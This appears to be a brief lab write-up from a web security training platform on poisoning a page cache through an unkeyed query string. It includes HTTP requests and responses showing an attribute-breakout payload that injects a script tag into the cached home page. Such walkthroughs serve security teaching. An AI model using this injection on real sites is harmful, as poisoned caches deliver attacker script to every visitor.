# **Web cache poisoning via an unkeyed query string**

Task: This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

Toolkit: BurpSuite, Browser

1. query string reflects in response

GET /?ds=1 HTTP/2  
Host: 0af80013044569fa80b45389007a0010.web-security-academy.net

HTTP/2 200 OK  
Content-Type: text/html; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=35  
Age: 8  
X-Cache: hit  
Content-Length: 8486

\<\!DOCTYPE html\>  
\<html\>  
\<\!--LAB\_HEAD\_START--\>  
    \<head\>  
        \<link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet\>  
        \<link href=/resources/css/labsBlog.css rel=stylesheet\>  
        \<link rel="canonical" href='//0af80013044569fa80b45389007a0010.web-security-academy.net/?ds=1'/\>  
        \<title\>

2. write query with &

GET /?q=345&'/\>\<script\>alert(1)\</script\> HTTP/2  
Host: [0af80013044569fa80b45389007a0010.web-security-academy.net](http://0af80013044569fa80b45389007a0010.web-security-academy.net)

       \<link rel="canonical" href='//[0af80013044569fa80b45389007a0010.web-security-academy.net/?q=345&'/](http://0af80013044569fa80b45389007a0010.web-security-academy.net/?q=345&'/)\>  
\<script\>alert(1)\</script\>  
'/\>  
        \<title\>  
DONE